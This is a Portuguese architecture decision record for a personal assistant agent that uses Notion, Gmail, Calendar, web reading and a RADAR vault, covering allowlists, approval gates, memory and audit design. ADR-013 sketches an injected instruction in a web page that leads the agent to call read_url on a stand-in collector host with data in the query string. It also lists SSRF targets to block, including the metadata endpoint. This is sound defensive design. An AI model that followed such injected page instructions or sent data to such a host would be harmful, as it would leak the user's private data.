Registro de decisões

Por que o sistema é construído assim

Decisões arquiteturais preservam o contexto que não aparece no código: o risco observado, as alternativas consideradas e o custo aceito.

Estado: decisões aceitas até o hardening conversacional RADAR. Mudá-las exige atualizar este registro, os testes de contrato e a documentação da fase afetada.

ADR-001 · Services determinísticos entre tools e integrações

Decisão: regras de tarefa e projeto permanecem em TaskService e ProjectService. O agente não monta payloads do Notion e o client HTTP não decide regras de negócio.

Motivo: o mesmo CRUD precisa ser testável e executável sem LLM. Essa fronteira permite trocar o modelo ou a interface sem reimplementar o domínio.

Alternativas: colocar o mapeamento no prompt reduziria código inicialmente, mas tornaria renomes de colunas e validação impossíveis de garantir. Um client “inteligente” misturaria HTTP com regras específicas desta aplicação.

ADR-002 · Tools específicas em vez de acesso genérico ao Notion

Decisão: o agente recebe somente search_projects, search_tasks, create_task, update_task e complete_task.

Motivo: cada operação possui schema, escopo de dados e resultado verificável. Um MCP genérico ou uma tool de HTTP daria acesso maior que o necessário e transferiria garantias do código para o prompt.

Trade-off: uma nova capacidade exige um novo service e uma nova tool. O custo é intencional: torna a expansão revisável e testável.

Revisada por: ADR-012 reabre esta decisão para permitir um canal de escrita via MCP, como fallback e sob aprovação humana obrigatória — a restrição original permanece a regra para tudo que as cinco tools já cobrem.

ADR-003 · Identidade é UUID mais pertença ao data source

Decisão: um identificador do Notion só é confiável quando passa por duas verificações: formato UUID canônico e pertença da página ao data source configurado.

texto do modelo
   ↓ valida UUID
id canônico
   ↓ retrieve_page
parent.data_source_id == data source permitido
   ↓
read ou mutation

Motivo: validar apenas uma string permitia que sintaxe de caminho alterasse o endpoint; validar apenas UUID ainda permitiria operar em outra página compartilhada com a integração. Formato e autorização resolvem problemas diferentes.

ADR-004 · Retry depende do efeito, não apenas do verbo HTTP

Decisão: leituras, queries e atribuições idempotentes podem repetir após falha transitória. Criação de página e append de blocos não repetem quando a resposta pode ter se perdido.

Motivo: após um timeout de leitura, repetir uma consulta é seguro. Após um timeout de POST /pages, o servidor pode ter criado a página; repetir automaticamente pode duplicar uma tarefa.

Resultado observadoRepresentaçãoConduta
API recusou antes de alterarfailedExplicar a falha; retry só quando a causa for segura.
Resposta de escrita se perdeuunknownNão repetir automaticamente; reconciliar primeiro.
Uma etapa aplicou e outra falhoupartialInformar campos confirmados e não confirmados.
Resposta válida confirmou tudosucceededPermitir confirmação ao usuário.

ADR-005 · Allowlist em publicação e em execução

Decisão: a lista de cinco tools é aplicada em duas fronteiras. O modelo só as enxerga, e qualquer chamada fora da lista é bloqueada antes do handler executar.

Motivo: esconder uma ferramenta não a remove do grafo. O Deep Agents pode registrar filesystem, shell e delegação internamente; um nome alucinado ou injetado ainda alcançaria o executor sem a segunda barreira.

Subagentes: a delegação task permanece desabilitada. Ela só volta quando existir um domínio próprio, ferramentas próprias e trilha de auditoria aninhada, conforme o Marco M6.

ADR-006 · O texto do modelo não decide o status operacional

Decisão: o resultado global de uma execução é derivado das tool calls. Uma resposta de sucesso não atravessa o gate se uma operação falhou, ficou parcial ou teve resultado desconhecido.

Motivo: instruções no prompt reduzem erros, mas não são uma pós-condição. O código possui os fatos — chamada, resultado e estado — e deve prevalecer sobre a prosa.

ADR-007 · Providers suportados são dependências diretas e fixadas

Decisão: Anthropic e OpenAI são os dois adapters anunciados; ambos ficam declarados diretamente e com versão fixada. O Compose encaminha a spec do modelo e as credenciais correspondentes.

Motivo: a superfície efetiva do Deep Agents varia entre versões e perfis. Uma reconstrução da imagem não pode alterar silenciosamente uma fronteira de segurança. Fixar versões troca atualização automática por upgrades intencionais e testados.

ADR-008 · Secrets não entram no build nem nos logs operacionais

Decisão: .dockerignore remove .env, repositório, ambientes virtuais e caches do contexto; logs registram estrutura, duração e estado, não valores livres de título/notas nem texto cru de exceções.

Motivo: não copiar um arquivo no Dockerfile não impede que ele seja enviado ao daemon. Da mesma forma, truncar um valor não o torna seguro. O log operacional deve permitir diagnóstico sem se transformar num segundo armazenamento de conteúdo sensível.

ADR-009 · Contexto temporal explícito; interpretação probabilística, validação determinística

Decisão: cada chamada de run_agent() calcula uma vez a data local, o dia da semana e o timezone IANA configurado, e entrega esses fatos ao modelo em uma mensagem de sistema própria da execução. O modelo pode interpretar “amanhã” ou “sexta”, mas precisa emitir YYYY-MM-DD; o schema da tool normaliza e valida esse valor novamente.

APP_TIMEZONE + instante timezone-aware
             ↓ código determinístico
data local + weekday + timezone
             ↓ contexto do run
LLM interpreta linguagem natural
             ↓ valor ainda não confiável
schema ISO estrito → date → service

Motivo: uma expressão relativa não possui significado sem uma data de referência e um fuso. Usar o relógio UTC do servidor, congelar “hoje” na construção do agente ou aceitar texto relativo diretamente na tool poderia deslocar um prazo sem produzir erro visível.

Alternativas: um parser temporal completo adicionaria dependência e regras linguísticas antes de existir necessidade comprovada; deixar tudo no prompt não garantiria formato nem validade de calendário. A solução atual usa zoneinfo da biblioteca padrão para os fatos objetivos, mantém a interpretação contextual no modelo e preserva a barreira determinística existente.

Trade-off: a interpretação de linguagem natural continua sujeita ao comportamento do modelo. Por isso a suíte padrão prova contexto, argumentos e efeitos com um modelo roteirizado, enquanto a avaliação do provider real é opt-in. Veja 006 — Datas e contexto temporal.

ADR-010 · Cancelamento é transição de estado, não exclusão

Decisão: cancel_reminder desativa a regra e preserva seu ledger. Uma ocorrência em produção disputa atomicamente a transição claimed → cancelled contra claimed → delivering. No primeiro caso nenhum request começa; no segundo a tool informa que a entrega já iniciada ainda pode chegar.

Motivo: apagar regra e ocorrências destruía a evidência necessária para reconstruir o que aconteceu e ainda não revogava o objeto já carregado pelo worker. Uma linha apagada no PostgreSQL não cancela I/O externo. Estados explícitos fazem a resposta ao usuário corresponder ao ponto real da execução.

Alternativas: manter uma transação aberta durante a chamada ao Telegram bloquearia o cancelamento por tempo de rede; apagar e prometer cancelamento imediato seria falso; aceitar sempre “mais uma mensagem” esconderia uma corrida evitável durante a produção do conteúdo.

Trade-off: depois de delivering não existe recall. A regra deixa de produzir ocorrências futuras, mas a tool precisa carregar um aviso. O custo de manter regras desativadas e ocorrências históricas é crescimento controlado do banco, aceito em troca de auditabilidade.

ADR-011 · Conflito de ocorrência fica dentro de savepoint

Decisão: o insert protegido por (job_id, scheduled_for) roda numa transação aninhada. Um conflito reverte apenas o savepoint; o avanço de next_run_at permanece apto a ser confirmado pela transação externa.

Motivo: no PostgreSQL, capturar IntegrityError em Python não reabilita a transação que o banco já marcou como abortada. Sem savepoint, a suposta rede de idempotência poderia transformar uma colisão num rollback do avanço e reapresentar o mesmo slot indefinidamente.

Alternativa: INSERT ... ON CONFLICT DO NOTHING também resolveria no PostgreSQL, mas exigiria ramificação por dialeto para os testes SQLite. O savepoint expressa a mesma fronteira com a API comum do SQLAlchemy.

ADR-012 · MCP do Notion como fallback de escrita, sob aprovação humana

Problema concreto: as cinco tools da ADR-002 cobrem o CRUD de tarefas e projetos nas duas data sources configuradas, mas nada além disso — uma propriedade sem tool própria, conteúdo em outra base, ou qualquer operação Notion fora desse escopo fica sem caminho algum para o agente, mesmo quando o pedido do usuário é legítimo.

Decisão: o agente ganha um pequeno conjunto de tools do servidor MCP oficial do Notion (@notionhq/notion-mcp-server, stdio, token de integração — ver app/agent/mcp_tools.py), publicadas como notion_mcp_*. As de leitura funcionam como as demais tools. Toda tool de escrita passa pelo mesmo portão de aprovação que já existia para write_file/edit_file/delete (app.agent.builtins.APPROVAL_REQUIRED_TOOLS): a chamada é recusada até o usuário responder sim a uma pergunta que já mostra o payload completo — não existe uma aprovação da chamada separada de uma aprovação dos dados, porque o payload é conhecido antes de qualquer efeito colateral.

modelo pede notion_mcp_API_post_page(...)
             ↓ ToolAllowlistMiddleware, antes do handler
sem aprovação registrada para este tool+payload exato → recusa
             ↓ aplicação pergunta ao usuário, mostrando o payload
"sim"
             ↓ próximo turno, grant repetido como resultado de tool
chamada liberada → sessão MCP stdio efêmera → Notion

Leitura de bases não configuradas (revisão de 2026-08-12): a allowlist de leitura passou a incluir API-retrieve-a-data-source e API-query-data-source. Uma base do Notion não é uma página: API-retrieve-page-markdown lê uma linha, se o usuário souber o link dela, mas não havia caminho algum para listar as linhas de uma base fora das duas configuradas — o agente encontrava a base pela busca e então explicava que não conseguia abri-la. As duas são leitura pura e ficam fora do portão de aprovação, como as demais leituras; o retrieve acompanha o query porque um filtro precisa dos nomes reais das propriedades, e um nome inventado devolve vazio, que se parece com uma base sem dados.

Trade-off aceito, explicitamente: o privilégio deixa de ser "escrita apenas nas duas data sources configuradas" e passa a ser "o que a integração alcançar no workspace" — a mesma integração usada por notion_client.py, cujo alcance real é decidido pelo compartilhamento configurado no Notion, não pelo código. A proveniência por busca prévia que protege create_task/update_task/complete_task (uma mutação só aceita um id que veio de uma busca sem ambiguidade no mesmo run) não existe para este canal — a aprovação humana assume esse papel em vez do código. E o schema de cada tool MCP não mora em um arquivo testado como notion_schema.py: vem de uma descoberta ao vivo contra o servidor, cacheada uma vez por processo, porque os nomes das tools já mudaram entre versões do servidor.

Por que a aprovação basta como mitigação: o argumento original da ADR-002 era que um MCP genérico "transferiria garantias do código para o prompt" — uma coluna renomeada viraria uma falha silenciosa de comportamento do modelo. Isso continua verdadeiro para o schema, mas deixa de importar para a segurança: nada é escrito sem que um humano tenha visto exatamente o payload primeiro, então um schema errado produz uma pergunta estranha ou uma chamada recusada pelo próprio Notion — nunca uma escrita silenciosa. A ADR-002 permanece a regra para tudo que as cinco tools cobrem; este canal só existe para o que sobra.

Alternativas descartadas: um segundo passo de confirmação, separado da autorização de usar o fallback, foi considerado e rejeitado — as tools MCP recebem o payload já nos argumentos da própria chamada, então um "posso tentar?" sem os dados ainda visíveis seria uma autorização às cegas, e um passo extra depois seria fricção sem ganho de segurança adicional. Um servidor MCP hospedado (Streamable HTTP) evitaria adicionar Node.js à imagem, mas usa OAuth interativo — o mesmo obstáculo à operação headless atrás de um webhook já registrado na página 003.

ADR-013 · Leitura da web sob aprovação por origem

Problema concreto: o usuário manda um link no Telegram — um artigo, uma página de empresa no LinkedIn, um vídeo — e espera que o assistente saiba do que se trata para registrar aquilo. Nenhuma das tools existentes alcança a web: o agente só conseguia repetir a URL de volta.

Decisão: uma única tool, read_url (app/tools/web.py), que busca uma página pública e devolve título, metadados Open Graph e texto legível. Não existe click, não existe type, não existe execução de JavaScript e não existe sessão entre chamadas. A tool passa pelo mesmo portão de aprovação de ADR-012, mas a chave aprovada é a origem (scheme://host), não a URL nem o payload: o usuário libera um site uma vez e as demais páginas dele seguem sem nova pergunta.

usuário cola https://exemplo.com/artigo
             ↓ app/application/telegram.py extrai a origem da mensagem crua
grant {read_url, https://exemplo.com} injetado como resultado de tool
             ↓ modelo pede read_url(...)
origem consta do grant → leitura liberada

modelo pede read_url(https://coletor.test/?dados=...)
             ↓ origem não consta de nenhum grant
recusa approval_required → aplicação pergunta ao usuário

Por que a origem, e por que o link do usuário já vem liberado: mandar um link é a permissão de abri-lo; perguntar "posso ler este site?" logo depois de o usuário colá-lo seria teatro, não consentimento. A distinção que sobra é a que tem valor de segurança e é a mesma ideia de proveniência que já protege as mutações do Notion: o que o usuário forneceu nesta mensagem é confiável, o que o modelo escolheu sozinho não é. Uma página é texto de terceiros e pode pedir que o agente "busque este outro endereço" — que é exatamente como dados sairiam daqui. Esse caso continua exigindo aprovação. Path, query e fragmento são descartados da chave justamente porque são as partes que um atacante variaria para carregar dados sob uma origem já aprovada.

Trade-off aceito: a AGENTS.MD §12 proíbe "HTTP arbitrário sem sandbox ou política específica". Esta é a política específica: apenas http/https, apenas endereços que resolvem para IP público — loopback, link-local, RFC1918 e o endpoint de metadados 169.254.169.254 são recusados antes de existir conexão, e a checagem se repete a cada redirect —, resposta limitada em bytes e em tempo, documento parseado e nunca avaliado. O que continua fora: um browser headless de verdade. Sem click/type não há navegação de múltiplos passos, então sites que dependem de JavaScript para renderizar conteúdo devolvem só o que publicam no <head>.

Limite medido, não suposto: verificado contra sites reais em 11/08/2026. Blogs, GitHub, Wikipedia, YouTube e páginas de empresa do LinkedIn devolvem Open Graph completo. Perfis pessoais do LinkedIn respondem HTTP 999 (anti-bot) e viram falha honesta. Posts do Instagram respondem 200 com casca vazia — o caso mais perigoso, porque uma leitura "bem-sucedida" sem conteúdo é a forma que mais convida a um resumo inventado. Por isso o envelope carrega content_available: uma página vazia é um fato que o modelo tem de relatar, não uma ausência que ele possa preencher.

O outro lado: gravar a referência. save_reference é uma tool de primeira classe, não uma chamada pelo fallback MCP da ADR-012. O fallback funcionaria, mas sua pergunta de aprovação mostra o payload JSON cru — correto para uma escrita arbitrária que ninguém previu, errado para a única operação que esta feature existe para tornar trivial. Guardar um link recém-enviado deve custar uma mensagem, não uma revisão de JSON. Pela mesma razão não há aprovação aqui: é uma criação numa data source dedicada, sem id para confundir e sem nada para sobrescrever — a mesma postura de create_task.

Tags abertas, forma fechada. A base é definida por esta aplicação, então REFERENCE_PROPERTIES em notion_schema.py descreve colunas que o usuário ainda precisa criar: Nome (title), URL (url), Tipo (select), Tags (multi_select), Fonte, Autor, Resumo (rich_text) e Salvo em (date). Tipo é lista fechada porque é a coluna pela qual se filtra e só serve se os valores forem estáveis. Tags é livre, porque etiquetar livremente é o ponto de uma biblioteca de referências — mas o Notion cria a opção na primeira escrita e nunca a remove, então reference_service.normalize_tags impõe a forma (aparadas, sem vírgula, deduplicadas sem diferenciar maiúsculas, no máximo oito) para que "IA", "ia " e "IA," não virem três opções permanentes com o mesmo significado.

Ausência é melhor que falha: enquanto NOTION_REFERENCE_DATA_SOURCE_ID não estiver configurado, save_reference não é publicada ao modelo (agent._available_tools). Publicar uma tool que sempre falha seria pior do que não ter nenhuma: um modelo informado de que sabe guardar referências dirá ao usuário que guardou.

Alternativas descartadas: Playwright em container isolado, falando CDP — dá conta de SPAs e de login, mas reabriria deliberadamente o execute que a builtins.py exclui, exigiria sessão persistente (cookies entre turnos são sequestro de sessão esperando acontecer) e custaria um container de browser para um bot Telegram de um usuário só. Fica disponível como evolução caso o limite acima passe a incomodar de fato. Um servidor MCP de browsing herdaria os mesmos riscos e adicionaria um processo externo a proteger.

ADR-014 · Memória de longo prazo é contexto, nunca autoridade

Problema concreto: toda execução começava do zero fora da janela de conversa. "Builders" precisava ser explicado toda semana, e uma preferência dita em março voltava a ser violada em agosto. Guardar isso é fácil; o difícil é que memória seria o único texto escrito pelo modelo a sobreviver à própria execução e a entrar em todas as seguintes.

Decisão: uma tabela agent_memories por thread, com teto de 2000 caracteres, injetada por inteiro como mensagem de sistema em cada execução, escrita por remember e apagada por forget. A regra que a torna segura é uma só: uma entrada pode mudar o que o assistente procura e o que ele pergunta; não pode mudar o que ele grava. Isso é enforçado em código, não no prompt — MemoryService recusa qualquer conteúdo com uuid, hexadecimal de 32 caracteres ou link notion.so. Uma entrada que não consegue nomear uma página não pode ser confundida com permissão para escrever nela, e a proveniência que protege update_task/complete_task (id vindo de uma busca sem ambiguidade no mesmo run) permanece intacta.

apelido guardado  →  expande o termo de busca
search_projects   →  devolve o id
mutação           →  aceita só esse id, como antes

Por que o Notion do usuário não é este store: a base PESSOAS, o board de tarefas e a biblioteca de referências já são um sistema de memória, mantido por ele. Uma cópia dentro do agente entraria em toda execução de graça, enquanto a página que ele edita só entra quando algo vai lê-la — o fato mais desatualizado viraria o mais barato de consultar. Daí o teste de destino no prompt e o kind context definido estreitamente: só o que não tem board (como nomear as coisas, como trabalhar com ele) mora aqui.

Nada é gravado em silêncio, e nada é aprovado duas vezes: a alternativa natural era submeter a escrita ao pending_write_approvals da ADR-012. Foi descartada por custo de fricção: cada "prefiro respostas curtas" viraria uma ida e volta, e o assistente pararia de anotar. No lugar, _memory_notice monta a partir do trace — nunca da prosa do modelo — uma linha anexada à mesma resposta dizendo o que foi registrado. O usuário revoga citando a entrada de volta. Se o assistente provar que registra coisa errada, a escalada é o portão que já existe, não um novo.

Um efeito colateral não pode custar a resposta: as duas tools ficam fora da evidência de que o status do run é derivado (_without_memory_writes). Sem isso, um remember recusado por orçamento faria _guarded_reply trocar uma resposta correta por "não consegui concluir o pedido". A falha continua sendo relatada pela linha determinística, uma vez por execução. Pela mesma razão, a terceira recusa seguida do mesmo run devolve done: true em vez de mandar consolidar de novo.

Trade-off aceito: o teto significa que memória cheia é uma recusa, não um despejo — nada é resumido sozinho nem descartado por idade. Isso transfere ao assistente a decisão de o que sacrificar, e ele pode escolher mal. É preferível à alternativa: uma entrada que some sem ninguém decidir é a que ninguém percebe que sumiu.

Alternativas descartadas: a arquitetura de memória do hermes-agent foi estudada em detalhe e três partes dela foram recusadas. A revisão de segundo plano (um agente forkado relendo cada turno para decidir sozinho o que salvar) dobraria o custo de LLM de toda mensagem e gravaria sem ninguém presente — a mesma objeção das três da manhã do Marco M8. A abstração de providers, com oito plugins externos, prefetch em background e busca semântica, existe porque o store deles é ilimitado; o teto aqui é justamente o que garante que o nosso continue cabendo no prompt, e recuperação só vira problema quando o store deixa de caber. E o store em arquivo (MEMORY.md com lock, detecção de drift e backup .bak) resolve com engenharia o que o PostgreSQL desta aplicação já resolve. Foram aproveitados o bloco congelado por sessão, o orçamento como erro com as entradas devolvidas, e a lição de tornar a recusa terminal depois de algumas tentativas.

ADR-016 · OAuth Google compartilhado, grants separados e calendário primary

Problema concreto: Calendar e Gmail usam a mesma família de autenticação, mas possuem dados, scopes e revogação independentes. Duplicar o lifecycle de token criaria duas implementações de expiração e 401; compartilhar um único refresh token criaria um grant amplo cuja revogação derrubaria as duas integrações.

Decisão: um GoogleOAuthTokenProvider reutilizável, com access token somente em memória e refresh antecipado, alimentado por um refresh token separado por integração. O bootstrap é um script de aplicação instalada com navegador, loopback, state, PKCE e acesso offline; ele imprime o secret uma vez e não edita configuração nem banco. Calendar opera somente sobre primary e usa os scopes calendar.events.owned e calendar.freebusy. Flags desligadas ou configuração incompleta retiram as tools da superfície.

GOOGLE_OAUTH_CLIENT_ID + CLIENT_SECRET
              ├── refresh token Calendar → access token em memória
              └── refresh token Gmail    → access token em memória

Semântica de write: leituras repetem 429/5xx. Escritas não repetem cegamente. Create de evento recebe um id remoto gerado antes do request; resposta perdida ou inválida é reconciliada por GET. Update usa leitura, merge e ETag. Quando a evidência não confirma o estado, o outcome permanece unknown.

Alternativas descartadas: SDK Google adicionaria dependências e esconderia parte do contrato sem remover a necessidade de validar payloads; service account não representa corretamente a agenda pessoal de um único usuário; um token único com todos os scopes aumentaria privilégio e acoplamento operacional.

Trade-off: OAuth desktop exige bootstrap manual e cuidado com o consent screen. O custo é aceito porque credenciais nunca transitam pelo Telegram e cada grant pode ser revogado isoladamente. Detalhes em 025 · Google Calendar.

ADR-017 · Gmail draft-only e auditoria por minimização

Problema concreto: a API Gmail torna fácil aproximar leitura, draft e envio numa mesma integração. Para um agente, porém, cada passo muda a natureza do risco: ler expõe conteúdo de terceiros; draft cria um objeto revisável; send fala irreversivelmente em nome do usuário. Ao mesmo tempo, a auditoria padrão copiaria query, endereço, subject, snippet e body para PostgreSQL.

Decisão: o client oferece somente search/get/drafts.create; o service oferece somente busca estruturada, leitura MIME paginada e draft plaintext. Não existe método, rota ou tool de envio. gmail.compose é usado exclusivamente porque drafts.create precisa dele. Attachment é metadata e nunca é baixado.

Proveniência: read aceita somente id retornado por busca do Chief no mesmo run; reply draft exige read confirmado ou busca única. E-mail é conteúdo não confiável e não pode autorizar nenhuma tool.

Auditoria: a projeção ocorre antes do insert. Busca guarda datas/flags/limite e fingerprints; leitura guarda ids, offsets, flags, tamanhos e hash; draft guarda ids remotos, contagem e hashes de destinatários, subject e body. Logs guardam operação, status, latência e tentativas, nunca conteúdo ou token.

Alternativas descartadas: confirmação antes de SEND não foi considerada suficiente, porque ainda deixaria código de envio alcançável e exigiria provar a integridade de outro approval round trip. HTML e anexos ampliariam parsing, injeção e storage antes de existir necessidade observada.

Trade-off: o usuário termina o fluxo no Gmail. Em troca, um erro do agente nunca envia uma mensagem e o draft pode ser revisado ou apagado. Detalhes em 026 · Gmail drafts.

ADR-018 · Filhos leem amplamente; somente o Chief escreve de forma durável

Problema concreto: com tarefas, agenda e e-mail, pesquisas multi-etapas já justificam especialização. Mas o trace durável do run enxerga a call task, não cada efeito interno; permitir write num filho criaria uma mutação que o status e a auditoria raiz não conseguem reconstruir.

Decisão: remover general-purpose e registrar task-agent, calendar-agent e email-agent. Cada um recebe somente leituras do domínio, filesystem read, list_memories, list_reminders, web sob a ADR-013 e MCP read-only. Todas as mutações externas/duráveis, MCP write, execute e task ficam ausentes e bloqueadas pela allowlist de execução.

filho pesquisa → DomainReport → Chief
                                ↓
                    repete busca mínima
                                ↓
                    única mutation durável

Scratch: cada invocação recebe uma cópia profunda do mapa files. Write é permitido sem aprovação somente sob /tmp/subagents/**, até 16 arquivos e 256 KiB. O resultado perde a chave files inteira, descartando scratch e offloads antes de alcançar o pai ou agent_thread_files.

Web: o filho herda somente origens que a aplicação marcou como confiáveis. Uma origem nova entra em requested_read_origins; o Chief inicia o fluxo normal de aprovação. Links encontrados numa página não herdam confiança.

Auditoria e limite aceito: task guarda tipo, status e projeção do DomainReport; briefing e texto livre viram tamanho/hash. Leituras internas logam correlação e metadata, sem conteúdo. Não há schema aninhado durável no M6 porque filhos não escrevem. Habilitar write real futuramente exige primeiro trace interno durável e uma nova ADR.

Alternativas descartadas: manter o filho general-purpose diluiria responsabilidade; entregar as mutations do domínio ao respectivo filho tornaria o relatório uma alegação impossível de conferir; retirar scratch tornaria consolidações longas desnecessariamente caras. Research Agent continua adiado até possuir tools e responsabilidade próprias. Detalhes em 027 · Subagentes de domínio.

ADR-019 · Toda integração de domínio é opcional, e o prompt deriva da superfície

Problema concreto: Notion era a única integração obrigatória. _build_services() construía o cliente incondicionalmente, as cinco tools de tarefa/projeto eram sempre publicadas e o SYSTEM_PROMPT era uma constante que descrevia todas elas. Uma instalação que quisesse partir deste repositório para outro conjunto de conexões não tinha como desligar o Notion sem apagar código, e Calendar e Gmail — já opcionais — expunham o outro lado do mesmo defeito: com os dois desligados, o prompt continuava descrevendo list_events e draft_email, e build_domain_subagents continuava compilando calendar-agent e email-agent sem tools de domínio.

Decisão: Notion passa a ser opcional nos mesmos termos de Calendar e Gmail — NOTION_ENABLED mais token e os dois data source ids, conferidos por settings.notion_configured antes de qualquer publicação — e o padrão é desligado. E o prompt deixa de ser uma constante: build_system_prompt(available) monta cada bloco a partir do mesmo frozenset de nomes que create_deep_agent recebe.

settings → _available_tools() ─┬→ create_deep_agent(tools=…)
                              ├→ build_system_prompt(names)
                              └→ build_domain_subagents(…, tools)

Por que derivar o prompt, e não apenas gatear as tools: o modelo responde ao usuário a partir do que o prompt prometeu, não a partir do que a superfície permite. Um parágrafo descrevendo search_tasks numa instalação sem Notion produz a pior das respostas possíveis — o assistente oferece consultar o board, chama uma tool que não existe, e relata a ausência da capacidade como "não encontrei nenhuma tarefa". Ausência de integração e resultado vazio são a mesma frase para o usuário, e só uma delas é verdade. Derivar dos nomes publicados torna essa divergência estruturalmente impossível em vez de meramente desaconselhada, e é a mesma tese da ADR-005 aplicada ao texto: o que vale é o que a aplicação decide, não o que o modelo herdou.

Consequências em cascata, todas na mesma direção: um domínio sem tools não compila subagente — um filho que responde "não encontrei nada" a todo briefing é lido pelo Chief como resultado, não como capacidade ausente. task_digest é recusado na criação, dentro da conversa onde o usuário ainda pode ouvir a recusa, em vez de falhar às três da manhã sem ninguém olhando. A numeração das regras é gerada, não escrita, para que uma regra retirada não deixe buraco entre "3." e "5.". E reference_library_configured() passa a exigir notion_configured: um id esquecido no .env não ressuscita save_reference sozinho.

O que a decisão não faz: não apaga nada. Nenhuma migration, nenhuma tabela, nenhum módulo — app/integrations/notion_client.py, os services e o fallback MCP continuam no repositório, testados, e voltam inteiros quando a flag volta. Os scripts operacionais (scripts/notion_schema.py, scripts/test_notion.py) constroem o cliente direto e por isso continuam funcionando com a flag desligada, que é exatamente o que se precisa para conferir o workspace antes de ligá-la.

Alternativas descartadas: remover o Notion do repositório entregaria um esqueleto mais limpo e destruiria o único exemplo completo de uma integração com proveniência, aprovação e fallback — o material de referência para as próximas conexões. Manter o prompt constante e apenas gatear as tools custaria menos trabalho e preservaria o defeito que motivou a ADR. Um segundo prompt escrito à mão para a instalação sem Notion duplicaria trezentas linhas que passariam a divergir na primeira edição.

ADR-020 · RADAR entra como pacote versionado e ABox em volume, antes de receber tools

Problema concreto: o runtime, a TBox e a ABox RADAR existiam no repositório irmão. Importar por caminho local ou copiar seus YAMLs faria o Personal-CoS depender do layout do Mac e criaria uma segunda fonte normativa. Publicar leitura imediatamente misturaria defeitos de distribuição, identidade, schema e volume com comportamento do agente.

Decisão: instalar radar-vault 0.2.0 do repositório privado pelo SHA completo associado à tag v0.2.0. O build recebe um token GitHub read-only somente como secret BuildKit e remove Git do runtime. Core, regras e políticas vêm somente da API pública do pacote. A ABox fica fora da imagem, montada em /data/radar-vault. A Fase 1 criou configuração, Principal confiável, factory/lifecycle e preflight. A Fase 2 publica apenas cinco consultas projetadas quando esse preflight está ready.

release imutável → pacote + TBox
volume persistente → ABox + .radar/
Settings + Telegram autorizado → Principal
                         ↓
                  ready ou degraded
                         ↓
                  Fase 2: cinco leituras projetadas

Fail-closed: a integração só chega a ready quando configuração, TBox, schema legível, estrutura, contrato do runtime, pessoa/contexto e permissão de auditoria são válidos. Qualquer falha vira um código seguro em radar.preflight.degraded; exceção, path, título e frontmatter não são registrados. A API e as outras integrações continuam disponíveis.

Identidade e leitura: o service deriva Principal.id do TELEGRAM_ALLOWED_USER_ID e usa o RADAR_PERSON_ID configurado no mesmo contexto. Grants e autonomia começam vazios. O modelo não recebe parâmetros capazes de mudar essa autoridade ou de escolher context. Resultados passam por DTOs limitados; paths, histórico, descrição/evidência no audit e frontmatter arbitrário não entram no trace persistido.

Alternativas descartadas: PYTHONPATH externo quebraria Docker; copiar a TBox envelheceria em paralelo; uma API HTTP RADAR adicionaria rede e autenticação sem consumidor remoto; montar o vault no build vazaria dados no artefato; começar pelas tools tornaria startup incompatível indistinguível de consulta vazia.

Trade-off: um snapshot por commit exige atualização deliberada e o volume exige backup, restore e ownership operacionais. Cinco tools específicas exigem ampliar uma a uma quando surgir uma pergunta nova, mas impedem consulta genérica e preservam um limite revisável. Detalhes em 029 · Consultas RADAR.

ADR-021 · Perguntas gerenciais viram consultas compostas, não um subagente

Problema concreto: as cinco leituras fundamentais da Fase 2 são seguras, mas perguntas diárias ainda deixavam a composição para o modelo. Identificar riscos e mitigações, comparar prazos/revisões, ligar decisões a evidências e reunir compromissos são operações repetíveis. A pergunta de riscos, por exemplo, precisava de busca, contexto genérico e seleção de relações antes da resposta.

Decisão: publicar no Chief cinco novas tools read-only: radar_get_risk_report, radar_list_action_attention, radar_get_decision_evidence, radar_get_person_commitments e radar_get_management_context. O RadarService executa travessias de até dois saltos, cálculo de datas e associação de termos; schemas preservam limites e não expõem contexto, Principal, grant, path ou operação.

busca identifica id
        ↓
uma tool composta no Chief
        ↓
service calcula e projeta
        ↓
DTO limitado + truncated

Por que não um management-agent: a referência de orquestração recomenda subagente quando há contexto especializado, planejamento multi-etapas ou isolamento útil. Nenhum desses sinais apareceu aqui: os dados vêm de um domínio, cada cenário agora cabe em uma chamada depois do id e o Chief já possui a identidade confiável. Um filho adicionaria briefing, relatório e trace indireto sem reduzir autoridade nem complexidade. A decisão será reaberta somente se conversas reais mostrarem encadeamentos recorrentes ou cruzamento de domínios.

Auditoria e read-only: o repository persiste somente ids, tipos, status, revisões, datas, motivos, contagens e flags. Título, descrição, body, decisão, racional e evidência livre não entram no trace. As consultas não alteram Markdown, embora o runtime acrescente eventos em .radar/audit. A fila de atenção escaneia no máximo 100 ações e pode gerar uma leitura auditada por ação porque o pacote não oferece detalhe em lote.

Validação: radar_validate_context continua sendo a sexta pergunta da fase. Finding, warning e error permanecem categorias distintas; um finding não é tratado automaticamente como corrupção. A projeção aceita os códigos normativos mistos, como RADAR-M001, e continua omitindo a prosa do validador.

Trade-off e aceite: a superfície cresce de cinco para dez leituras e cada nova pergunta ainda exige contrato próprio. Em troca, o resultado é determinístico e testável, sem linguagem genérica de consulta. O deployment e os testes operacionais concluíram os aceites técnico e de produto; o relatório de traces permanece para acompanhar regressões e orientar a Fase 4. Detalhes em 030 · Consultas gerenciais RADAR.

ADR-022 · Aprovação RADAR executa comando persistido, não mensagem reconstruída

Problema concreto: uma alteração RADAR precisa sobreviver ao intervalo entre pedido e confirmação sem aceitar contexto, grant, revisão ou texto reescrito por um modelo. A aprovação genérica existente reexecuta a solicitação por LLM e por isso não tem essa propriedade.

Decisão: preparar cada operação publicamente no pacote sem efeitos, salvar seu payload normalizado, revisão, expiração e chave de idempotência em pending_radar_operations, e executar esse registro somente depois do claim atômico de um “sim” autenticado. O Principal é reconstruído e reautorizado no instante da execução.

Consequências: “não” não chama runtime nem modelo; conflito de revisão é terminal e não re-prepara; resposta incerta só pode reconciliar o mesmo payload com a mesma chave. O índice parcial limita pending/executing/uncertain a uma thread. Scheduler e subagentes ficam sem essa superfície. Detalhes em 031 · Mutações RADAR aprovadas.

ADR-023 · Identidade canônica não é linguagem de conversa nem autoridade implícita

Problema concreto: IDs, revisões e símbolos RADAR ajudavam o modelo, mas tornavam a conversa difícil de reconhecer e responder. Ocultá-los apenas no prompt não resolveria continuidade nem segurança: o modelo poderia escolher um item de uma busca ambígua, lê-lo e usar essa leitura como proveniência de escrita.

Decisão de apresentação: a aplicação traduz vocabulário e substitui identidade técnica por título/nome, salvo pedido técnico explícito. Ambiguidade vira uma lista numerada com tipo e estado; itens ainda indistinguíveis pedem responsável, prazo ou contexto, sem sufixo de ID. Uma thread mantém somente uma lista numérica entre RADAR e Notion.

